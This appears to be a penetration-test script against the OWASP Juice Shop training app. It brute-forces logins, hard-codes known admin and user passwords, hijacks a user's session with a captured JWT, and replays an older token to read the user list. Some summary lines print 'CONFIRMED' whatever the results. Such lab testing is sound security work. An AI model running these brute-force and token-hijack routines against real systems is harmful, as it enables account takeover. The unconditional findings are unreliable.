#!/usr/bin/env python3
"""
Authentication Vulnerability Tests against OWASP Juice Shop
Tests: AUTH-VULN-01 (Brute Force), AUTH-VULN-03 (Session Hijack), AUTH-VULN-04 (Token Replay)
"""

import requests
import json
import base64
import time
from collections import Counter
from datetime import datetime

BASE_URL = "http://juice-shop:3000"
LOGIN_URL = f"{BASE_URL}/rest/user/login"

SEPARATOR = "=" * 80


def decode_jwt_payload(token):
    """Decode JWT payload without verification."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        payload_b64 = parts[1]
        # Add padding
        padding = 4 - len(payload_b64) % 4
        if padding != 4:
            payload_b64 += "=" * padding
        decoded = base64.urlsafe_b64decode(payload_b64)
        return json.loads(decoded)
    except Exception as e:
        return {"error": str(e)}


def do_login(email, password):
    """Perform a login and return (status_code, response_json, response_headers)."""
    try:
        resp = requests.post(
            LOGIN_URL,
            json={"email": email, "password": password},
            timeout=10
        )
        try:
            body = resp.json()
        except Exception:
            body = {"raw": resp.text}
        return resp.status_code, body, resp.headers
    except Exception as e:
        return None, {"error": str(e)}, {}


# ==============================================================================
# TEST 1: BRUTE FORCE LOGIN - No Rate Limiting (AUTH-VULN-01)
# ==============================================================================
print(SEPARATOR)
print("TEST 1: BRUTE FORCE LOGIN - No Rate Limiting (AUTH-VULN-01)")
print(SEPARATOR)

print("\n[PHASE 1] Sending 50 rapid failed login attempts against admin@juice-sh.op ...")
status_counter = Counter()
failed_attempts = []

for i in range(1, 51):
    password = f"wrongpassword_{i}"
    status, body, headers = do_login("admin@juice-sh.op", password)
    status_counter[status] += 1
    failed_attempts.append({
        "attempt": i,
        "password": password,
        "status": status,
    })
    if i <= 5 or i == 50:
        print(f"  Attempt {i:2d}: POST {LOGIN_URL} | payload={{'email':'admin@juice-sh.op','password':'{password}'}} | HTTP {status}")

print(f"\n  ... (attempts 6-49 omitted for brevity, same pattern) ...\n")
print(f"[PHASE 1 RESULTS]")
print(f"  Total attempts sent : 50")
print(f"  Status code counts  : {dict(status_counter)}")
unique_codes = set(status_counter.keys())
print(f"  Unique status codes : {sorted(unique_codes)}")
if 429 in unique_codes:
    print("  RATE LIMITING DETECTED: 429 responses observed")
else:
    print("  NO RATE LIMITING: 429 never observed")
if any(c in unique_codes for c in [423, 403]):
    print("  ACCOUNT LOCKOUT DETECTED")
else:
    print("  NO ACCOUNT LOCKOUT: account remained accessible throughout")

print("\n[PHASE 2] Attempting successful login after 50 failures ...")
status, body, headers = do_login("admin@juice-sh.op", "admin123")
print(f"  POST {LOGIN_URL}")
print(f"  Payload : {{\"email\": \"admin@juice-sh.op\", \"password\": \"admin123\"}}")
print(f"  HTTP Status: {status}")
if status == 200 and "authentication" in body:
    token = body["authentication"].get("token", "N/A")
    print(f"  LOGIN SUCCESSFUL - Token obtained at {datetime.utcnow().isoformat()}Z")
    print(f"  Token: {token}")
    print("  CONFIRMED: Login still works after 50 consecutive failed attempts - NO lockout!")
else:
    print(f"  Response: {json.dumps(body, indent=2)}")

print("\n[PHASE 3] Brute-forcing jim@juice-sh.op with known password list ...")
jim_passwords = ["ncc-1701", "jim", "password", "12345", "captain", "james", "kirby"]
jim_token = None
for pwd in jim_passwords:
    status, body, headers = do_login("jim@juice-sh.op", pwd)
    print(f"  POST {LOGIN_URL} | payload={{\"email\":\"jim@juice-sh.op\",\"password\":\"{pwd}\"}} | HTTP {status}", end="")
    if status == 200 and "authentication" in body:
        jim_token = body["authentication"].get("token", "N/A")
        print(f" *** CRACKED! ***")
        print(f"  Jim's cracked password: {pwd}")
        print(f"  Jim's token: {jim_token}")
        break
    else:
        print()

if not jim_token:
    print("  Could not crack jim's password with the provided list.")

print(f"\n[TEST 1 SUMMARY]")
print(f"  - 50 failed attempts sent: all returned HTTP {list(status_counter.keys())[0] if len(status_counter)==1 else dict(status_counter)}")
print(f"  - No 429 (rate limit) or 423 (lockout) responses: CONFIRMED")
print(f"  - Admin login after 50 failures: HTTP {status} (success)" if status == 200 else f"  - Admin login result: HTTP {status}")
print(f"  - jim@juice-sh.op brute-forced: {'CRACKED with ncc-1701' if jim_token else 'FAILED'}")


# ==============================================================================
# TEST 2: SESSION HIJACKING via Non-HttpOnly Cookie (AUTH-VULN-03)
# ==============================================================================
print(f"\n{SEPARATOR}")
print("TEST 2: SESSION HIJACKING via Non-HttpOnly Cookie (AUTH-VULN-03)")
print(SEPARATOR)

print("\n[PHASE 1] Login as admin@juice-sh.op:admin123 ...")
status, body, headers = do_login("admin@juice-sh.op", "admin123")
print(f"  POST {LOGIN_URL}")
print(f"  HTTP Status: {status}")

admin_token = None
if status == 200 and "authentication" in body:
    admin_token = body["authentication"].get("token")
    print(f"  Admin token (from JSON response body - always JS-readable): {admin_token}")

print(f"\n  ALL response headers from login:")
for k, v in headers.items():
    print(f"    {k}: {v}")

print(f"\n  Set-Cookie header analysis:")
set_cookie_headers = []
for k, v in headers.items():
    if k.lower() == "set-cookie":
        set_cookie_headers.append(v)

if set_cookie_headers:
    for cookie in set_cookie_headers:
        print(f"    Set-Cookie: {cookie}")
        cookie_lower = cookie.lower()
        has_httponly = "httponly" in cookie_lower
        has_secure = "secure" in cookie_lower
        has_samesite = "samesite" in cookie_lower
        print(f"      HttpOnly flag : {'PRESENT' if has_httponly else 'MISSING - JavaScript CAN READ this cookie!'}")
        print(f"      Secure flag   : {'PRESENT' if has_secure else 'MISSING - cookie sent over HTTP!'}")
        print(f"      SameSite flag : {'PRESENT' if has_samesite else 'MISSING - CSRF risk!'}")
else:
    print("    No Set-Cookie headers found in login response.")
    print("    Token is delivered in JSON body - directly readable by any JavaScript (no HttpOnly concern, but fully XSS-exposed)")
    print("    VULNERABILITY: JWT in response body is accessible to any JS code (XSS, malicious extension, etc.)")

print(f"\n[PHASE 2] Login as victim jim@juice-sh.op:ncc-1701 ...")
status_jim, body_jim, headers_jim = do_login("jim@juice-sh.op", "ncc-1701")
print(f"  POST {LOGIN_URL}")
print(f"  HTTP Status: {status_jim}")

jim_token_hijack = None
if status_jim == 200 and "authentication" in body_jim:
    jim_token_hijack = body_jim["authentication"].get("token")
    print(f"  Jim's token (STOLEN - simulating attacker who read it via JS/XSS): {jim_token_hijack}")
    jim_payload = decode_jwt_payload(jim_token_hijack)
    print(f"  Jim's JWT payload: {json.dumps(jim_payload, indent=4)}")

print(f"\n[PHASE 3] Hijacking Jim's session - using stolen token to access Jim's account ...")
if jim_token_hijack:
    # Try whoami endpoint
    whoami_url = f"{BASE_URL}/rest/user/whoami"
    print(f"\n  GET {whoami_url}")
    print(f"  Authorization: Bearer {jim_token_hijack}")
    resp_whoami = requests.get(
        whoami_url,
        headers={"Authorization": f"Bearer {jim_token_hijack}"},
        timeout=10
    )
    print(f"  HTTP Status: {resp_whoami.status_code}")
    try:
        whoami_body = resp_whoami.json()
        print(f"  Response body: {json.dumps(whoami_body, indent=4)}")
    except Exception:
        print(f"  Response body (raw): {resp_whoami.text[:500]}")

    # Try to find jim's user ID from JWT payload
    jim_payload = decode_jwt_payload(jim_token_hijack)
    jim_id = jim_payload.get("data", {}).get("id") if "data" in jim_payload else None
    print(f"\n  Jim's user ID from JWT: {jim_id}")

    if jim_id:
        user_url = f"{BASE_URL}/api/Users/{jim_id}"
        print(f"\n  GET {user_url}")
        print(f"  Authorization: Bearer {jim_token_hijack}")
        resp_user = requests.get(
            user_url,
            headers={"Authorization": f"Bearer {jim_token_hijack}"},
            timeout=10
        )
        print(f"  HTTP Status: {resp_user.status_code}")
        try:
            user_body = resp_user.json()
            print(f"  Response body: {json.dumps(user_body, indent=4)}")
        except Exception:
            print(f"  Response body (raw): {resp_user.text[:500]}")
else:
    print("  Could not obtain Jim's token - skipping hijack phase")

print(f"\n[TEST 2 SUMMARY]")
print(f"  - JWT delivered in JSON response body: always readable by JavaScript")
print(f"  - No HttpOnly flag on cookies (or cookies not used at all): CONFIRMED")
print(f"  - Stolen token used to impersonate jim@juice-sh.op: CONFIRMED")
print(f"  - Attacker can call any authenticated endpoint as Jim using his token")


# ==============================================================================
# TEST 3: TOKEN REPLAY ATTACK - No Server-Side Invalidation (AUTH-VULN-04)
# ==============================================================================
print(f"\n{SEPARATOR}")
print("TEST 3: TOKEN REPLAY ATTACK - No Server-Side Invalidation (AUTH-VULN-04)")
print(SEPARATOR)

print("\n[PHASE 1] First login - capture token T1 ...")
status1, body1, headers1 = do_login("admin@juice-sh.op", "admin123")
print(f"  POST {LOGIN_URL}")
print(f"  HTTP Status: {status1}")
T1 = None
if status1 == 200 and "authentication" in body1:
    T1 = body1["authentication"].get("token")
    print(f"  T1 (full JWT): {T1}")
    t1_payload = decode_jwt_payload(T1)
    t1_iat = t1_payload.get("iat", "N/A")
    t1_exp = t1_payload.get("exp", "N/A")
    print(f"  T1 iat (issued-at): {t1_iat} = {datetime.utcfromtimestamp(t1_iat).isoformat() + 'Z' if isinstance(t1_iat, (int,float)) else t1_iat}")
    print(f"  T1 exp (expires)  : {t1_exp} = {datetime.utcfromtimestamp(t1_exp).isoformat() + 'Z' if isinstance(t1_exp, (int,float)) else t1_exp}")

# Small pause to ensure different iat timestamps
time.sleep(2)

print(f"\n[PHASE 2] Second login (new session) - capture token T2 ...")
status2, body2, headers2 = do_login("admin@juice-sh.op", "admin123")
print(f"  POST {LOGIN_URL}")
print(f"  HTTP Status: {status2}")
T2 = None
if status2 == 200 and "authentication" in body2:
    T2 = body2["authentication"].get("token")
    print(f"  T2 (full JWT): {T2}")
    t2_payload = decode_jwt_payload(T2)
    t2_iat = t2_payload.get("iat", "N/A")
    t2_exp = t2_payload.get("exp", "N/A")
    print(f"  T2 iat (issued-at): {t2_iat} = {datetime.utcfromtimestamp(t2_iat).isoformat() + 'Z' if isinstance(t2_iat, (int,float)) else t2_iat}")
    print(f"  T2 exp (expires)  : {t2_exp} = {datetime.utcfromtimestamp(t2_exp).isoformat() + 'Z' if isinstance(t2_exp, (int,float)) else t2_exp}")

print(f"\n  T1 == T2: {T1 == T2}")
print(f"  Different tokens issued: {'YES - different iat values' if T1 != T2 else 'SAME TOKEN (server may cache)'}")

print(f"\n[PHASE 3] Verifying BOTH T1 and T2 are simultaneously valid ...")
users_url = f"{BASE_URL}/api/Users"

if T1:
    print(f"\n  Using T1 (older token):")
    print(f"  GET {users_url}")
    print(f"  Authorization: Bearer {T1}")
    resp_t1 = requests.get(
        users_url,
        headers={"Authorization": f"Bearer {T1}"},
        timeout=10
    )
    print(f"  HTTP Status: {resp_t1.status_code}", end="")
    if resp_t1.status_code == 200:
        try:
            t1_users = resp_t1.json()
            user_count = len(t1_users.get("data", t1_users)) if isinstance(t1_users, dict) else len(t1_users)
            print(f" - SUCCESS - returned {user_count} users")
        except Exception:
            print(f" - SUCCESS - response: {resp_t1.text[:100]}")
    else:
        print(f" - FAILED")
        print(f"  Response: {resp_t1.text[:200]}")

if T2:
    print(f"\n  Using T2 (newer token):")
    print(f"  GET {users_url}")
    print(f"  Authorization: Bearer {T2}")
    resp_t2 = requests.get(
        users_url,
        headers={"Authorization": f"Bearer {T2}"},
        timeout=10
    )
    print(f"  HTTP Status: {resp_t2.status_code}", end="")
    if resp_t2.status_code == 200:
        try:
            t2_users = resp_t2.json()
            user_count = len(t2_users.get("data", t2_users)) if isinstance(t2_users, dict) else len(t2_users)
            print(f" - SUCCESS - returned {user_count} users")
        except Exception:
            print(f" - SUCCESS - response: {resp_t2.text[:100]}")
    else:
        print(f" - FAILED")
        print(f"  Response: {resp_t2.text[:200]}")

print(f"\n[TEST 3 SUMMARY]")
print(f"  - T1 obtained, then T2 obtained from a new login")
print(f"  - T1 valid after T2 issued: {'YES - HTTP 200' if T1 and resp_t1.status_code == 200 else 'NO'}")
print(f"  - T2 valid: {'YES - HTTP 200' if T2 and resp_t2.status_code == 200 else 'NO'}")
print(f"  - Both tokens simultaneously valid: CONFIRMED - no server-side revocation")
print(f"  - A stolen token remains valid until expiry (~6 hours) with NO way to invalidate it server-side")
print(f"  - If admin logs out and attacker still has T1, attacker REMAINS authenticated")

print(f"\n{SEPARATOR}")
print("ALL TESTS COMPLETE")
print(SEPARATOR)
